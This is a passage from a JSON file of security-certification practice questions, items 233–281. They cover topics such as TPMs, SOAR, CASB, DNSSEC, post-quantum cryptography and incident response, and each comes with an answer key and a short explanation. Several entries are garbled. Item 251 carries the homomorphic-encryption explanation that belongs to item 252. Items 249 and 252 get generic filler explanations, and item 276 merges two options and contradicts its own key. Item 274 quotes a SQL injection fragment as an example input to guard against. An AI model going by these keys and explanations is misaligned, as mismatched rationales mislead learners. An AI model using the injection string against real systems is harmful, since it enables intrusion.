storage"},"answer":"D","explanation":"Windows and most enterprise FDE expect a TPM soldered on the board. No OEM TPM means the laptop cannot meet the encryption requirement and has to be replaced.\n\nImagine a car that was built without a steering lock — you cannot bolt that lock on later in a way the insurer will accept.","choose":1,"pbq":false,"exhibits":[]},{"id":233,"domain":4,"stem":"A company's security policy states that any publicly available server must be patched within 12 hours after a patch is released. A recent IIS zero-day vulnerability was discovered that affects all versions of the Windows Server OS: Which of the following hosts should a security analyst patch first once a patch is available?","options":{"A":"1","B":"2","C":"3","D":"4","E":"5","F":"6"},"answer":"D","explanation":"Policy is “public servers get the IIS patch within 12 hours.” Host 4 is the public Windows/IIS box in the table, so it is first.\n\nImagine a food recall that hits grocery shelves before the warehouse staff kitchen.","choose":1,"pbq":false,"exhibits":["exhibits/q233_1.png"]},{"id":234,"domain":1,"stem":"A central bank implements strict risk mitigations for the hardware supply chain, including an allow list for specific countries of origin. Which of the following best describes the cyberthreat to the bank?","options":{"A":"Ability to obtain components during wartime","B":"Fragility to DDoS and other availability attacks","C":"Physical implants and tampering","D":"Non-conformance to accepted manufacturing standards"},"answer":"C","explanation":"A central bank that allow-lists hardware countries of origin is worried someone in the factory or the crate will implant extra silicon or firmware.\n\nThat threat is physical implants and tampering.\n\nImagine only buying padlocks from two countries because a third country's locks have been found with extra keys inside.\n\nWartime supply and DDoS are other worries. They are not why you inspect origin.","choose":1,"pbq":false,"exhibits":[]},{"id":235,"domain":4,"stem":"An organization has noticed an increase in phishing campaigns utilizing typosquatting. A security analyst needs to enrich the data for commonly used domains against the domains used in phishing campaigns. The analyst uses a log forwarder to forward network logs to the SIEM. Which of the following would allow the security analyst to perform this analysis?","options":{"A":"Use a cron job to regularly update and compare domains.","B":"Create a parser that matches domains.","C":"Develop a query that filters out all matching domain names.","D":"Implement a dashboard on the SIEM that shows the percentage of traffic by domain."},"answer":"B","explanation":"Typosquat domains only help you if the SIEM can pick hostnames out of proxy or DNS logs and compare them to your real list. A parser that extracts domains is the missing piece.\n\nImagine a mailroom clerk who is taught to read the address line so you can compare “paypa1.com” to “paypal.com.”","choose":1,"pbq":false,"exhibits":[]},{"id":236,"domain":4,"stem":"A security analyst wants to use lessons learned from a prior incident response to reduce dwell time in the future. The analyst is using the following data points: Which of the following would the analyst most likely recommend?","options":{"A":"Adjusting the SIEM to alert on attempts to visit phishing sites","B":"Allowing TRACE method traffic to enable better log correlation","C":"Enabling alerting on all suspicious administrator behavior","D":"Utilizing allow lists on the WAF for all users using GET methods"},"answer":"A","explanation":"Dwell time started when users visited phishing sites and nobody got a page. Alert on those attempts so the next campaign is caught at click-time.\n\nImagine a store that finally puts a chime on the “Employees Only” door after last month’s thief walked through it unnoticed.","choose":1,"pbq":false,"exhibits":["exhibits/q236_1.png"]},{"id":237,"domain":3,"stem":"After a penetration test on the internal network the following report was generated: Which of the following should be recommended to remediate the attack?","options":{"A":"Deleting SQLSV","B":"Reimaging ADMIN01$","C":"Rotating KRBTGT password","D":"Resetting the local domain"},"answer":"C","explanation":"The pentest report is a Kerberos domain persistence trick (golden ticket). Those tickets are minted with the KRBTGT hash, so rotating that password twice invalidates stolen tickets.\n\nImagine changing the master stamp the forger used to print backstage passes; old fakes stop working at the door.","choose":1,"pbq":false,"exhibits":["exhibits/q237_1.png"]},{"id":238,"domain":4,"stem":"A security engineer is given the following requirements: • ONLY execute internally signed applications. • Administrator accounts cannot install unauthorized software • Attempts to run unauthorized software must be logged Which of the following best meets these requirements?","options":{"A":"Maintaining appropriate account access through directory management and controls","B":"Implementing a CSPM platform to monitor updates being pushed to applications","C":"Deploying an EDR solution to monitor and respond to software installation attempts","D":"Configuring application control with blocked hashes and enterprise-trusted root certificates"},"answer":"D","explanation":"“Only internally signed apps, no surprise installs, log the rest” is application control: trust your enterprise signing cert, block known-bad hashes, and audit every refused start.\n\nImagine a club that only plays CDs with the venue’s own shrink-wrap seal and writes down every bootleg someone tries to sneak in.","choose":1,"pbq":false,"exhibits":[]},{"id":239,"domain":3,"stem":"After an organization met with its ISAC, the organization decided to test the resiliency of its security controls against a small number of advanced threat actors. Which of the following will enable the security administrator to accomplish this task?","options":{"A":"Adversary emulation","B":"Reliability factors","C":"Deployment of a honeypot","D":"Internal reconnaissance"},"answer":"A","explanation":"ISAC intel plus “test us against a few named advanced actors” is adversary emulation: replay those actors’ known techniques against your stack.\n\nImagine hiring a red team that must burgle you the same way last year’s famous crew did, not invent a new movie plot.","choose":1,"pbq":false,"exhibits":[]},{"id":240,"domain":4,"stem":"After a cybersecurity incident, a security analyst was able to collect a binary that the attacker used on the compromised server. Then the analyst ran the following command: Which of the following options describes what the analyst is trying to do?","options":{"A":"To reconstruct the timeline of commands executed by the binary","B":"To extract IoCs from the binary used on the attack","C":"To replicate the attack in a secure environment","D":"To debug the binary to analyze low-level instructions"},"answer":"B","explanation":"The command is pulling strings, hashes, URLs, or other constants out of the attacker binary — those are IoCs you can hunt for elsewhere.\n\nImagine reading the return address on a thief’s dropped envelope so you can watch that mailbox.","choose":1,"pbq":false,"exhibits":["exhibits/q240_1.png"]},{"id":241,"domain":3,"stem":"A senior security engineer flags the following log file snippet as having likely facilitated an attacker's lateral movement in a recent breach: Which of the following solutions, if implemented, would mitigate the risk of this issue reoccurring?","options":{"A":"Disabling DNS zone transfers","B":"Restricting DNS traffic to UDP/53","C":"Implementing DNS masking on internal servers","D":"Permitting only clients from internal networks to query DNS"},"answer":"A","explanation":"The log shows a DNS zone transfer dumping your whole internal name list, which then guided lateral movement. Turn zone transfers off except to authorized secondaries.\n\nImagine a receptionist who photocopies the entire employee directory for anyone who asks at the desk.","choose":1,"pbq":false,"exhibits":["exhibits/q241_1.png"]},{"id":242,"domain":1,"stem":"To prevent data breaches, security leaders at a company decide to expand user education to: • Create a healthy security culture. • Comply with regulatory requirements • Improve incident reporting Which of the following would best meet their objective?","options":{"A":"Performing a DoS attack","B":"Scheduling regular penetration tests","C":"Simulating a phishing campaign","D":"Deploying fake ransomware"},"answer":"C","explanation":"A healthy reporting culture plus phishing competence is built by sending fake phish and teaching from the clicks — a simulated phishing campaign.\n\nImagine a fire drill that also teaches people which alarm is real.\n\nA live DoS or fake ransomware against staff is the wrong drill and can be harmful. A pentest tests systems, not the reporting habit.","choose":1,"pbq":false,"exhibits":[]},{"id":243,"domain":3,"stem":"An external SaaS solution user reports a bug associated with the role-based access control module. This bug allows users to bypass system logic associated with client segmentation in the multitenant deployment model. When assessing the bug report, the developer finds that the same bug was previously identified and addressed in an earlier release. The developer then determines the bug was reintroduced when an existing software component was integrated from a prior version of the platform. Which of the following is the best way to prevent this scenario?","options":{"A":"Regression testing","B":"Code signing","C":"Automated test and retest","D":"User acceptance testing","E":"Software composition analysis"},"answer":"A","explanation":"A fixed RBAC bug came back when old code was reused. Regression tests replay the original failing case on every release so a cured bug cannot quietly return.\n\nImagine a mechanic who always re-checks the same brake recall after every service, not only the first time.","choose":1,"pbq":false,"exhibits":[]},{"id":244,"domain":4,"stem":"After several companies in the financial industry were affected by a similar incident, they shared information about threat intelligence and the malware used for exploitation. Which of the following should the companies do to best indicate whether the attacks are being conducted by the same actor?","options":{"A":"Apply code stylometry.","B":"Look for common TTPs.","C":"Use IoC extractions.","D":"Leverage malware detonation."},"answer":"B","explanation":"Same malware file is weak evidence. Shared tactics, techniques, and procedures across the incidents are how you decide it is one actor versus copycats.\n\nImagine two bank jobs that both used the same tunnel, lunch hour, and getaway van pattern.","choose":1,"pbq":false,"exhibits":[]},{"id":245,"domain":3,"stem":"Which of the following most likely explains the reason a security engineer replaced ECC with a lattice-based cryptographic technique?","options":{"A":"It is computationally efficient and provides perfect forward secrecy.","B":"It is more resilient to brute-force attacks than ECC.","C":"It supports ephemeral key exchange and digital signatures.","D":"It is currently considered a robust PQC technique.","E":"It enables processing on data while remaining in an encrypted state."},"answer":"D","explanation":"Lattice schemes are in the current NIST post-quantum set. ECC is the algorithm quantum computers are expected to break; the engineer swapped for a PQC primitive.\n\nImagine replacing a lock whose keyway is already in a published “how to pick this in 2030” paper.","choose":1,"pbq":false,"exhibits":[]},{"id":246,"domain":4,"stem":"An administrator reviews the following log and determines the root cause of a site-to-site tunnel failure: Which of the following actions should the administrator take to most effectively correct the failure?","options":{"A":"Enable perfect forward secrecy on the remote peer.","B":"Update the cipher suites configured for use on the server side.","C":"Add a new subnet as a permitted initiator.","D":"Disable IKE version 1 and run IKE version 2."},"answer":"C","explanation":"The tunnel log says the initiator’s subnet is not on the allowed list. Add that subnet as a permitted speaker so Phase 2 has a valid proxy identity.\n\nImagine a parking garage that already has your name but not your new license plate — add the plate, do not rebuild the gate.","choose":1,"pbq":false,"exhibits":["exhibits/q246_1.png"]},{"id":247,"domain":2,"stem":"A security architect is mitigating a vulnerability that previously led to a web application data breach. An analysis into the root cause of the issue finds the following: • An administrator’s account was hijacked and used on several Autonomous System Numbers within 30 minutes. • All administrators use named accounts that require multifactor authentication. • Single sign-on is used for all company applications. Which of the following should the security architect do to mitigate the issue?","options":{"A":"Configure token theft detections on the single sign-on system with automatic account lockouts.","B":"Enable context-based authentication when network locations change on administrator login attempts.","C":"Decentralize administrator accounts and force unique passwords for each application.","D":"Enforce biometric authentication requirements for the administrator’s named accounts."},"answer":"B","explanation":"An admin MFA session jumped ASNs in 30 minutes — token theft or impossible travel. Context-based rules when location changes stop that token from being reused across the planet.\n\nLockouts help after the fact. Extra biometrics on the same stolen session cookie may still pass.\n\nImagine a badge that stops working the moment it is swiped in two cities in one coffee break.","choose":1,"pbq":false,"exhibits":[]},{"id":248,"domain":3,"stem":"An organization currently has IDS, firewall, and DLP systems in place. The systems administrator needs to integrate the tools in the environment to reduce response time. Which of the following should the administrator use?","options":{"A":"SOAR","B":"CWPP","C":"XCCDF","D":"CMDB"},"answer":"A","explanation":"IDS, firewall, and DLP already fire. SOAR is the glue that takes those alerts and runs the playbook so a human is not copy-pasting between three consoles.\n\nImagine a 911 dispatcher who can lock the doors and page security from one headset instead of three separate phones.","choose":1,"pbq":false,"exhibits":[]},{"id":249,"domain":3,"stem":"A company migrating to a remote work model requires that company-owned devices connect to a VPN before logging in to the device itself. The VPN gateway requires that a specific key extension is deployed to the machine certificates in the internal PKI. Which of the following best explains this requirement?","options":{"A":"The certificate is an additional factor to meet regulatory MFA requirements for VPN access.","B":"The VPN client selected the certificate with the correct key usage without user interaction.","C":"The internal PKI certificate deployment allows for Wi-Fi connectivity before logging in to other systems.","D":"The server connection uses SSL VPN, which uses certificates for secure communication."},"answer":"B","explanation":"Match the missing capability in the stem to the control that actually closes that gap, not a neighboring product name.\n\nImagine hiring the plumber who fixes this leak, not the crew with the shiniest truck.","choose":1,"pbq":false,"exhibits":[]},{"id":250,"domain":2,"stem":"A company that uses several cloud applications wants to property identify: All the devices potentially affected by a given vulnerability • All the devices potentially affected by a given vulnerability • All the internal servers utilizing the same physical switch • The number of endpoints using a particular operating system Which of the following is the best way to meet the requirements?","options":{"A":"SBoM","B":"CASB","C":"GRC","D":"CMDB"},"answer":"D","explanation":"Same questions as a good CMDB: which asset has this CVE, who shares this switch, how many endpoints run this OS.\n\nSBOM is ingredients in one product. CASB is SaaS. GRC is policy.\n\nImagine one warehouse map instead of three clipboards.","choose":1,"pbq":false,"exhibits":[]},{"id":251,"domain":3,"stem":"An external threat actor attacks public infrastructure providers. In response to the attack and during follow-up activities, various providers share information obtained during response efforts. After the attack, energy sector companies share their status and response data: Which of the following is the most important issue to address to defend against future attacks?","options":{"A":"Failure to implement a UEBA system","B":"Failure to implement a DLP system","C":"Failure to join the industry ISAC","D":"Failure to integrate with the TIP"},"answer":"D","explanation":"Homomorphic math exists; what is missing in most data centers is hardware that can do those operations at usable speed. Weak coprocessor support is why it is still niche.\n\nImagine a recipe that only works with a commercial blast chiller when every home kitchen still has a mini-fridge.","choose":1,"pbq":false,"exhibits":["exhibits/q251_1.png"]},{"id":252,"domain":3,"stem":"Which of the following best describes the challenges associated with widespread adoption of homomorphic encryption techniques?","options":{"A":"Incomplete mathematical primitives","B":"No use cases to drive adoption","C":"Quantum computers not yet capable","D":"Insufficient coprocessor support"},"answer":"D","explanation":"The finding or log is telling you which control failed. Apply the fix that matches that evidence rather than a neighboring tool category.\n\nImagine treating a flat tire with a wrench, not with a new radio.","choose":1,"pbq":false,"exhibits":[]},{"id":253,"domain":1,"stem":"A company is migrating from company-owned phones to a BYOD strategy for mobile devices. The pilot program will start with the executive management team and be rolled out to the rest of the staff in phases. The company’s Chief Financial Officer loses a phone multiple times a year. Which of the following will most likely secure the data on the lost device?","options":{"A":"Require a VPN to be active to access company data.","B":"Set up different profiles based on the person’s risk.","C":"Remotely wipe the device.","D":"Require MFA to access company applications."},"answer":"C","explanation":"Executives on BYOD lose phones. The control that makes the data on that handset go away is a remote wipe (MDM or equivalent).\n\nVPN and MFA protect the next logon. They do not erase the mail already sitting on the seat of a taxi.\n\nImagine a remote eraser on a notebook you left on a train.","choose":1,"pbq":false,"exhibits":[]},{"id":254,"domain":2,"stem":"Company A acquired Company B. Both companies serve a user base in different geographic regions but now collectively serve a globally distributed user base. A security architect needs to design resilient monitoring systems with the following requirements: • User data must remain on the systems of each respective company. • Low latency is needed for all users regardless of company location and user location. • Each company must have its own redundancy. Which of the following practices are the most beneficial in meeting the requirements? (Choose two).","options":{"A":"Replicating each company’s system in the other company’s region","B":"Adding additional resources in each company’s original region","C":"Implementing a network load balancer","D":"Deploying a reverse proxy","E":"Utilizing an API gateway","F":"Enabling automated vertical scaling"},"answer":"B,C","explanation":"Data stays in each company, low latency everywhere, each side keeps its own spare capacity: add capacity in each original region and put a load balancer in front so users hit the near, healthy side.\n\nCopying A's system into B's region moves data across the line the stem forbade.\n\nImagine two kitchens that each get a second oven, plus a host who seats you in the closer dining room.","choose":2,"pbq":false,"exhibits":[]},{"id":255,"domain":4,"stem":"During a security assessment using an EDR solution, a security engineer generates the following report about the assets in the system: After five days, the EDR console reports a blocked infection on the host 0WIN23 by a remote access Trojan. Which of the following most likely enabled the attempted infection?","options":{"A":"0WIN23 uses a legacy version of Windows that is not supported by the EDR.","B":"LN002 was not supported by the EDR solution and propagates the RAT.","C":"0WIN29’s EDR has an unknown vulnerability that was exploited by the attacker.","D":"MAC005 spreads the malware through other hosts in the network."},"answer":"C","explanation":"Five days later 0WIN23 is hit by a RAT. The report’s odd one-out is 0WIN29’s EDR being unhealthy or unpatched — that box is the likely beachhead.\n\nImagine a flu going through an office after one coworker skipped the vaccine the chart already flagged.","choose":1,"pbq":false,"exhibits":["exhibits/q255_1.png"]},{"id":256,"domain":4,"stem":"A security engineer must ensure that sensitive corporate information is not exposed if a company laptop is stolen. Which of the following actions best addresses this requirement?","options":{"A":"Utilizing desktop as a service for all company data and multifactor authentication","B":"Using explicit allow lists of specific IP addresses and deploying single sign-on","C":"Deploying mobile device management and requiring stronger passwords","D":"Updating security mobile reporting policies and monitoring data breaches"},"answer":"A","explanation":"If the laptop never holds the files — they live in a hosted desktop reached with MFA — a thief has a brick, not a file cabinet.\n\nImagine leaving the real files in a locked office and only carrying a screen that goes dark without your badge.","choose":1,"pbq":false,"exhibits":[]},{"id":257,"domain":2,"stem":"A company discovers intellectual property data on commonly known collaboration web applications that allow the use of slide templates. The systems administrator is reviewing the configurations of each tool to determine how to prevent this issue. The following security solutions are deployed: • CASB • SASE • WAF • EDR • Firewall • IDS • SIEM • DLP endpoints Which of the following should the administrator do to address the issue?","options":{"A":"Enable blocking for all WAF policies.","B":"Enforce a policy to block unauthorized web applications within CASB.","C":"Create an alert within the SIEM for outgoing network traffic to the suspected website.","D":"Configure DLP endpoints to block sensitive data to removable storage."},"answer":"B","explanation":"IP leaked onto consumer slide sites. CASB is the control already on the list that can block those unsanctioned apps.\n\nA SIEM alert only watches. Endpoint DLP to USB is the wrong channel.\n\nImagine telling the mall guard which stores are banned, since you already hired that guard.","choose":1,"pbq":false,"exhibits":[]},{"id":258,"domain":4,"stem":"After some employees are caught uploading data to online personal storage accounts, a company becomes concerned about data leaks related to sensitive, internal documentation. Which of the following would the company most likely do to decrease this type of risk?","options":{"A":"Improve firewall rules to block source IP addresses.","B":"Implement a cloud access security broker.","C":"Create SIEM rules to raise alerts for access to those platforms.","D":"Deploy a FIM solution to trigger when files are accessed."},"answer":"B","explanation":"Staff are using personal SaaS drives. A CASB sits between users and those clouds, sees the upload, and can block or coach on sensitive files.\n\nImagine a mailroom that checks boxes headed to a public storage locker, not only trucks leaving the loading dock.","choose":1,"pbq":false,"exhibits":[]},{"id":259,"domain":3,"stem":"A global company’s Chief Financial Officer (CFO) receives a phone call from someone claiming to be the Chief Executive Officer (CEO). The caller claims to be stranded and in desperate need of money. The CFO is suspicious, but the caller’s voice sounds similar to the CEO’s. Which of the following best describes this type of attack?","options":{"A":"Smishing","B":"Deepfake","C":"Automated exploit generation","D":"Spear phishing"},"answer":"B","explanation":"The voice sounds like the CEO because it was synthesized from samples — a deepfake vishing call. Smishing is SMS; spear phishing is usually email.\n\nImagine a phone call from “mom” that used a recording of mom’s laugh, not a text from a random number.","choose":1,"pbq":false,"exhibits":[]},{"id":260,"domain":3,"stem":"A cloud engineer wants to configure mail security protocols to support email authenticity and enable the flow of email security information to a third-party platform for further analysis. Which of the following must be configured to achieve these requirements? (Choose two.)","options":{"A":"DMARC","B":"DKIM","C":"TLS","D":"SPF","E":"DNSSEC","F":"MX"},"answer":"A,B","explanation":"DKIM signs the message so receivers can prove it left your domain intact. DMARC tells receivers what to do on a fail and can send XML reports to a third party for analysis.\n\nImagine a wax seal on the letter (DKIM) plus a printed instruction to the post office on what to do with a broken seal (DMARC).","choose":2,"pbq":false,"exhibits":[]},{"id":261,"domain":1,"stem":"A company is preparing to move a new version of a web application to production. No issues were reported during security scanning or quality assurance in the CI/CD pipeline. Which of the following actions should the company take next?","options":{"A":"Merge the test branch to the main branch.","B":"Perform threat modeling on the production application.","C":"Conduct unit testing on the submitted code.","D":"Perform a peer review on the test branch."},"answer":"D","explanation":"Scan and QA in CI/CD were clean. Before production, another human should read the test branch. That is a peer review.\n\nMerging first skips that gate. Unit tests and threat models should already have happened earlier in the pipeline.\n\nImagine two cooks tasting the soup before it leaves the kitchen, after the thermometer already said it was hot enough.","choose":1,"pbq":false,"exhibits":[]},{"id":262,"domain":4,"stem":"A SOC team receives notifications that align with playbook incidents. The team wants to analyze the potential threat actor’s TTPs. Which of the following will best assist the SOC team?","options":{"A":"D3FEND","B":"OWASP","C":"ATT&CK","D":"COPPA","E":"CAPEC"},"answer":"C","explanation":"Playbook alerts describe what fired. ATT&CK is the catalog that maps those behaviors to tactics and techniques so you can name the actor’s TTP chain.\n\nImagine a field guide that turns “someone jimmied the back window at 2 a.m.” into a standard burglar playbook page.","choose":1,"pbq":false,"exhibits":[]},{"id":263,"domain":3,"stem":"Which of the following best describes the reason PQC preparation is important?","options":{"A":"To protect data against decryption due to increases in computational resource availability","B":"To have larger key lengths available through key stretching","C":"To improve encryption performance and speed using lightweight cryptography","D":"To leverage asymmetric encryption for large amounts of data"},"answer":"A","explanation":"Shor’s algorithm on a large quantum computer breaks today’s RSA and ECC. Data stolen now can be decrypted later, which is why post-quantum cryptography planning matters.\n\nImagine a thief photocopying your locked diary today because they expect a master key to be sold in ten years.","choose":1,"pbq":false,"exhibits":[]},{"id":264,"domain":4,"stem":"After investigating a recent security incident, a SOC analyst is charged with creating a reference guide for the entire team to use. Which of the following should the analyst create to address future incidents?","options":{"A":"Root cause analysis","B":"Communication plan","C":"Runbook","D":"Lessons learned"},"answer":"C","explanation":"A reference the whole SOC can follow during the next event is a runbook: step-by-step actions, owners, and tools.\n\nImagine a laminated card on the fryer: if the oil catches fire, do these four steps. That card is the runbook.","choose":1,"pbq":false,"exhibits":[]},{"id":265,"domain":2,"stem":"A DNS forward lookup zone named comptia.org must: • Ensure the DNS is protected from on-path attacks. • Ensure zone transfers use mutual authentication and are authenticated and negotiated. Which of the following should the security architect configure to meet these requirements? (Choose two).","options":{"A":"Public keys","B":"Conditional forwarders","C":"Root hints","D":"DNSSEC","E":"CNAME records","F":"SRV records"},"answer":"A,D","explanation":"Stop on-path lies about comptia.org and authenticate zone transfers: DNSSEC for the zone, and keys (public-key crypto) so transfers are mutually authenticated.\n\nCNAMEs and root hints do not sign the zone.\n\nImagine a signed official roster plus a handshake before anyone copies the roster to another office.","choose":2,"pbq":false,"exhibits":[]},{"id":266,"domain":2,"stem":"A security architect is implementing a SOAR solution in an organization’s cloud production environment to support detection capabilities. Which of the following will be the most likely benefit?","options":{"A":"Improved security operations center performance","B":"Automated firewall log collection tasks","C":"Optimized cloud resource utilization","D":"Increased risk visibility"},"answer":"A","explanation":"SOAR in production detection exists to make the SOC faster: playbooks fire, tickets open, repeats shrink.\n\nIt is not mainly a cost-saving cloud trick.\n\nImagine a written fire drill the system can start without a meeting.","choose":1,"pbq":false,"exhibits":[]},{"id":267,"domain":2,"stem":"A cloud security architect has been tasked with finding a solution for hardening VMs. The solution must meet the following requirements: • Data needs to be stored outside of the VMs. • No unauthorized modifications to the VMs are allowed. • If a change needs to be done, a new VM needs to be deployed. Which of the following is the best solution?","options":{"A":"Immutable system","B":"Data loss prevention","C":"Storage area network","D":"Baseline template"},"answer":"A","explanation":"Data off the VM, no live edits, replace instead of patch: that is an immutable system.\n\nA SAN is just disks. A baseline template can still be edited in place.\n\nImagine treating servers like sealed bottles: if the recipe changes, you pour a new bottle; you do not unscrew the cap.","choose":1,"pbq":false,"exhibits":[]},{"id":268,"domain":2,"stem":"After the latest risk assessment, the Chief Information Security Officer (CISO) decides to meet with the development and security teams to find a way to reduce the security task workload. The CISO would like to: • Have a solution that uses an API to communicate with other security tools. • Use the latest technology possible. • Have the highest controls possible on the solution. Which of following is the best option to meet these requirements?","options":{"A":"EDR","B":"CSP","C":"SOAR","D":"CASB"},"answer":"C","explanation":"API to other tools, modern stack, strong control of response: SOAR.\n\nEDR is endpoint. CASB is SaaS. CSP is the cloud vendor.\n\nImagine a switchboard that can call the firewall, the ticket system, and the pager from one playbook.","choose":1,"pbq":false,"exhibits":[]},{"id":269,"domain":4,"stem":"A new, online file hosting service is being offered. The service has the following security requirements: • Threats to customer data integrity and availability should be remediated first. • The environment should be dynamic to match increasing customer demands. • The solution should not interfere with customers’ ability to access their data at anytime. • Security analysts should focus on high-risk items. Which of the following would best satisfy the requirements?","options":{"A":"Expanding the use of IPS and NGFW devices throughout the environment","B":"Increasing the number of analysts to identify risks that need remediation","C":"Implementing a SOAR solution to address known threats","D":"Integrating enterprise threat feeds in the existing SIEM"},"answer":"C","explanation":"Integrity and availability threats that you already know, a growing estate, and analysts who should only touch high-risk work — that is SOAR: auto-contain the known bad.\n\nImagine sprinklers that kill the small kitchen fires so the fire crew is free for the warehouse.","choose":1,"pbq":false,"exhibits":[]},{"id":270,"domain":4,"stem":"A university issues badges through a homegrown identity management system to all staff and students. Each week during the summer, temporary summer school students arrive and need to be issued a badge to access minimal campus resources. The security team received a report from an outside auditor indicating the homegrown system is not consistent with best practices in the security field. Which of the following should the security team recommend first?","options":{"A":"Investigating a potential threat identified in logs related to the identity management system","B":"Updating the identity management system to use discretionary access control","C":"Beginning research on two-factor authentication to later introduce into the identity management system","D":"Working with procurement and creating a requirements document to select a new IAM system/vendor"},"answer":"D","explanation":"A homegrown badge system that already failed an audit will not get safer with one extra feature. Write requirements and buy a proper IAM product that can issue least-privilege summer badges the right way.\n\nImagine a homemade cash register that keeps failing inspection — you write a shopping list and buy a real register.","choose":1,"pbq":false,"exhibits":[]},{"id":271,"domain":2,"stem":"Which of the following are risks associated with vendor lock-in? (Choose two.)","options":{"A":"The client can seamlessly move data.","B":"The vendor can change product offerings.","C":"The client receives a sufficient level of service.","D":"The client experiences decreased quality of service.","E":"The client can leverage a multicloud approach.","F":"The client experiences increased interoperability."},"answer":"B,D","explanation":"Vendor lock-in risks: they can change the product, and your service quality can drop while you cannot leave easily.\n\nSeamless moves and multicloud are the opposite of lock-in.\n\nImagine a phone plan you cannot quit when they raise the price and drop coverage.","choose":2,"pbq":false,"exhibits":[]},{"id":272,"domain":4,"stem":"Due to budget constraints, an organization created a policy that only permits vulnerabilities rated high and critical according to CVSS to be fixed or mitigated. A security analyst notices that many vulnerabilities that were previously scored as medium are now breaching higher thresholds. Upon further investigation, the analyst notices certain ratings are not aligned with the approved system categorization. Which of the following can the analyst do to get a better picture of the risk while adhering to the organization’s policy?","options":{"A":"Align the exploitability metrics to the predetermined system categorization.","B":"Align the remediation levels to the predetermined system categorization.","C":"Align the impact subscore requirements to the predetermined system categorization.","D":"Align the attack vectors to the predetermined system categorization."},"answer":"C","explanation":"CVSS impact scores were generic, so “medium” issues on crown-jewel systems were under-ranked. Recalibrate the impact subscore to the real system categorization.\n\nImagine a smoke alarm that treats a warehouse fire like a birthday candle because nobody told it the building is full of paper.","choose":1,"pbq":false,"exhibits":[]},{"id":273,"domain":1,"stem":"An IT department is currently working to implement an enterprise DLP solution. Due diligence and best practices must be followed in regard to mitigating risk. Which of the following ensures that authorized modifications are well planned and executed?","options":{"A":"Risk management","B":"Network management","C":"Configuration management","D":"Change management"},"answer":"D","explanation":"Authorized DLP changes must be requested, approved, tested, and recorded. That process is change management.\n\nImagine a building permit before anyone moves a wall. Risk management names the risk. Configuration management tracks the resulting settings.","choose":1,"pbq":false,"exhibits":[]},{"id":274,"domain":2,"stem":"A security architect wants to prevent security impacts from input into data fields, such as the following: 'AND 1=1# Which of the following would best accomplish this objective?","options":{"A":"APIs","B":"Coding standards","C":"Base64 encoding","D":"Sandboxing"},"answer":"B","explanation":"'AND 1=1# is classic injection in a field. Coding standards (parameterized queries, input rules) stop that class.\n\nBase64 is encoding, not safety. A sandbox contains after the fact.\n\nImagine a form that will only accept a table number, not a new order scribbled onto the ticket.","choose":1,"pbq":false,"exhibits":[]},{"id":275,"domain":1,"stem":"A software development company needs to mitigate third-party risks to its software supply chain. Which of the following techniques should the company use in the development environment to best meet this objective?","options":{"A":"Performing software composition analysis","B":"Requiring multifactor authentication","C":"Establishing coding standards and monitoring for compliance","D":"Implementing a robust unit and regression-testing scheme"},"answer":"A","explanation":"Third-party risk inside the build is the libraries you import. Software composition analysis inventories those packages and their known holes.\n\nMFA and unit tests protect other things. They do not read the ingredient label.\n\nImagine checking every spice jar for a recall notice before you cook.","choose":1,"pbq":false,"exhibits":[]},{"id":276,"domain":3,"stem":"A mobile device hardware manufacturer receives the following requirements from a company that wants to produce and sell a new mobile platform: • The platform should store biometric data. • The platform should prevent unapproved firmware from being loaded. • A tamper-resistant, hardware-based counter should track if unapproved firmware was loaded. Which of the following should the hardware manufacturer implement? (Choose two.)","options":{"A":"ASLR","B":"NX","C":"eFuse","D":"SED","E":"SELinux","F":"Secure boot","G":"Shell restriction H Secure enclave"},"answer":"C,F","explanation":"Biometrics stay in a hardware vault; Secure Boot stops unsigned firmware; an eFuse permanently records that someone tried to load unapproved code.\n\nImagine a safe that only opens with a fingerprint, will not run a bootleg operating manual, and snaps a plastic seal if anyone tries.","choose":2,"pbq":false,"exhibits":[]},{"id":277,"domain":1,"stem":"Based on a recent security audit, a company discovered the perimeter strategy is inadequate for its recent growth. To address this issue, the company is looking for a solution that includes the following requirements: • Collapse of multiple network security technologies into a single footprint • Support for multiple VPNs with different security contexts • Support for application layer security (Layer 7 of the OSI Model) Which of the following technologies would be the most appropriate solution given these requirements?","options":{"A":"NAT gateway","B":"Reverse proxy","C":"NGFW","D":"NIDS"},"answer":"C","explanation":"They want several security functions in one box, several VPNs with separate contexts, and Layer-7 inspection. That product is a next-generation firewall.\n\nA NAT gateway translates addresses. A reverse proxy fronts one app. NIDS mostly watches.\n\nImagine a single front door that can check ID, look in bags, and send different visitors down different hallways.","choose":1,"pbq":false,"exhibits":[]},{"id":278,"domain":3,"stem":"A security administrator has isolated a computer system because it was targeted by a ransomware attack. Which of the following should the security administrator do to recover from this attack in the most secure way?","options":{"A":"Check if file versioning is enabled and restore the files.","B":"Restore the system from a baseline snapshot.","C":"Determine if the encryption key can be recovered. If it can, restore the files.","D":"Seek approval from senior leadership to pay the ransom and unencrypt the files with the provided key."},"answer":"B","explanation":"Isolated ransomware recovery that you can trust is a known-good baseline snapshot or image from before the infection, not negotiating for the attacker’s key.\n\nImagine restoring a video-game save from last Sunday instead of paying the cheat vendor to unlock this afternoon’s corrupted file.","choose":1,"pbq":false,"exhibits":[]},{"id":279,"domain":4,"stem":"A user from the sales department opened a suspicious file attachment. The sales department then contacted the SOC to investigate a number of unresponsive systems, and the team successfully identified the file and the origin of the attack. Which of the following is the next step of the incident response plan?","options":{"A":"Remediation","B":"Containment","C":"Response","D":"Recovery"},"answer":"B","explanation":"You know the bad file and which desks it hit. Next official IR step is containment: stop it spreading before you rebuild.\n\nImagine a grease fire: put the lid on the pan before you mop the floor.","choose":1,"pbq":false,"exhibits":[]},{"id":280,"domain":4,"stem":"A security manager has written an incident response playbook for insider attacks and is ready to begin testing it. Which of the following should the manager conduct to test the playbook?","options":{"A":"Automated vulnerability scanning","B":"Centralized logging, data analytics, and visualization","C":"Threat hunting","D":"Threat emulation"},"answer":"D","explanation":"A playbook for insider attacks is tested by acting out those attacks (threat emulation) and watching whether the steps work.\n\nImagine a bank running a staged “teller theft” to see if the alarm script actually pages the right manager.","choose":1,"pbq":false,"exhibits":[]},{"id":281,"domain":2,"stem":"The Chief Security Officer (CSO) requested the security team implement technical controls that meet the following requirements: • Monitors traffic to and from both local NAS and cloud-based file repositories • Prevents on-site staff who are accessing sensitive customer PII documents on file repositories from accidentally or deliberately sharing sensitive documents on personal SaaS solutions • Uses document attributes to reduce false positives • Is agentless and not installed on staff desktops or laptops Which of the following when installed and configured would best meet the CSO’s requirements? (Choose 